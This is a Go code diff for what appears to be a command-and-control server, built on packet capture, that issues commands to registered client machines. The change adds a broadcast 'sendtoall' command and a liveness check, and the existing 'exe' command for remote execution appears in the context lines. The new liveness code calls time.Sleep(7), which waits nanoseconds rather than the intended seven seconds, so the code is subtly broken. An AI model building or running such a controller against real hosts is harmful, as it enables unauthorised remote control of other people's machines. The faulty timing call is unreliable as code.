@@ -10,6 +10,7 @@ import (
 	"sort"
 	"strconv"
 	"strings"
+	"time"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -204,6 +205,44 @@ func checkalive(src string, payload string) {
 	}
 }
 
+func showalive() {
+	// for value in ALIVE:
+	//     if ALIVE[value] == True:
+	//         print(
+	//             f"\033[92m[{list(clients.keys())[list(clients.values()).index(value)]}]\033[0m",
+	//             end=" ",
+	//         )
+	//     elif ALIVE[value] == False:
+	//         print(
+	//             f"\033[91m[{list(clients.keys())[list(clients.values()).index(value)]}]\033[0m",
+	//             end=" ",
+	//         )
+	// print()
+
+	// for client in clients:
+	// 	ALIVE[clients.get(client)] = False
+	// arguments = ["checkalive", "alive"]
+	// sendtoall(arguments, clients, execute=False)
+	// time.sleep(7)
+	// show_alive(clients)
+
+	for aclient, avar := range ALIVE {
+		if avar == true {
+			for clientid, clientip := range clients {
+				if clientip == aclient {
+					fmt.Printf("\033[92m[%d]\033[0m", clientid)
+				}
+			}
+		} else {
+			for clientid, clientip := range clients {
+				if clientip == aclient {
+					fmt.Printf("\033[91m[%d]\033[0m", clientid)
+				}
+			}
+		}
+	}
+}
+
 func deviceExists(name string) bool {
 	devices, err := pcap.FindAllDevs()
 	if err != nil {
@@ -352,10 +391,19 @@ func main() {
 		} else if strings.HasPrefix(input, "ls") {
 			showclients()
 
+		} else if strings.HasPrefix(input, "sendtoall") {
+			_, command, _ := strings.Cut(input, " ")
+			command = strings.TrimRight(command, "\r\n")
+			fmt.Println("[BEFORE]", command)
+			for k := range clients {
+				sendmessage(command, k, *c)
+			}
+
 		} else if strings.HasPrefix(input, "send") {
 			_, after, _ := strings.Cut(input, " ")
 			id, command, _ := strings.Cut(after, " ")
 			clientid := parse_id(id)
+			command = strings.TrimRight(command, "\r\n")
 			if _, ok := clients[clientid]; ok {
 				sendmessage(command, clientid, *c)
 			} else {
@@ -363,15 +411,7 @@ func main() {
 				continue
 			}
 
-		} else if strings.HasPrefix(input, "sendtoall") {
-			_, command, _ := strings.Cut(input, " ")
-			command = strings.TrimRight(command, "\r\n")
-			for k := range clients {
-				sendmessage(command, k, *c)
-			}
-
 		} else if strings.HasPrefix(input, "exe") {
-
 			_, after, _ := strings.Cut(input, " ")
 			id, command, _ := strings.Cut(after, " ")
 			clientid := parse_id(id)
@@ -390,9 +430,18 @@ func main() {
 			}
 
 		} else if strings.HasPrefix(input, "checkalive") {
-			for k := range clients {
-				sendmessage("ping", k, *c)
+			// for client in clients:
+			// 	ALIVE[clients.get(client)] = False
+			// arguments = ["checkalive", "alive"]
+			// sendtoall(arguments, clients, execute=False)
+			// time.sleep(7)
+			// show_alive(clients)
+			for id, client := range clients {
+				ALIVE[client] = false
+				sendmessage("ping", id, *c)
 			}
+			time.Sleep(7)
+			showalive()
 
 		} else if strings.HasPrefix(input, "help") {
 			print_help()
